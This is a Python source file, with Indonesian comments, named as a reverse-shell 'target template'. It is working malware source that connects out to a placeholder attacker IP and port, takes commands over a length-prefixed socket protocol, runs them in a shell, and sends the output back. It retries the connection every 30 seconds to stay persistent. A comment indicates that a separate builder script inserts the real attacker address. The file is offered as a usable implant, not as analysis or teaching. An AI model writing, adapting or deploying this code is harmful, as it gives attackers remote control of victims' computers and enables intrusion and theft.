# /home/pblrks611/PROTO/reverse_shell/target_template.py

import socket
import subprocess
import os
import struct
import time

# Placeholder ini akan diganti secara dinamis oleh skrip utama Anda
SERVER_IP = "YOUR_IP_HERE"  
SERVER_PORT = 12345

def send_data(sock, data):
    """Mengemas dan mengirim data dengan aman."""
    try:
        data_len = struct.pack('>I', len(data))
        sock.sendall(data_len + data)
    except Exception:
        pass

def receive_data(sock):
    """Menerima data dengan aman."""
    try:
        raw_msglen = sock.recv(4)
        if not raw_msglen:
            return None
        msglen = struct.unpack('>I', raw_msglen)[0]
        full_data = b''
        while len(full_data) < msglen:
            packet = sock.recv(msglen - len(full_data))
            if not packet:
                return None
            full_data += packet
        return full_data
    except Exception:
        return None

def connect():
    """Loop utama untuk koneksi dan eksekusi perintah."""
    while True: # Loop untuk mencoba koneksi ulang
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_IP, SERVER_PORT))
            
            while True: # Loop untuk menerima perintah
                command_bytes = receive_data(s)
                if command_bytes is None:
                    break
                
                command = command_bytes.decode("utf-8", errors="ignore")

                if command.lower() == "exit":
                    break
                elif command.strip().startswith("cd "):
                    try:
                        os.chdir(command.strip()[3:])
                        send_data(s, os.getcwd().encode())
                    except Exception as e:
                        send_data(s, str(e).encode())
                else:
                    output = subprocess.run(command, shell=True, capture_output=True, text=False)
                    result = output.stdout + output.stderr
                    if not result:
                        result = b"[+] Perintah dieksekusi tanpa output."
                    send_data(s, result)
            
            s.close()
            # Jika 'exit' dipanggil, keluar dari loop koneksi ulang juga
            if command.lower() == "exit":
                break

        except Exception:
            # Jika koneksi gagal, tunggu 30 detik sebelum mencoba lagi
            time.sleep(30)
            continue

if __name__ == "__main__":
    connect()
